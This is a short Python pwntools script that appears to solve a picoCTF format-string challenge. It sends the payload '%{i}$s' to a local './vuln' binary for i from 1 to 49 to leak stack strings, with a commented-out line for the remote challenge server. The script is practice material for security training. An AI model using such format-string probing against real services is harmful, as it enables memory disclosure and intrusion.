#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./vuln',level = 'warn')
    #io = remote('mercury.picoctf.net', 59616, level='warn')
    payload = f'%{i}$s'
    io.sendline(payload)
    print(io.recvall())
    
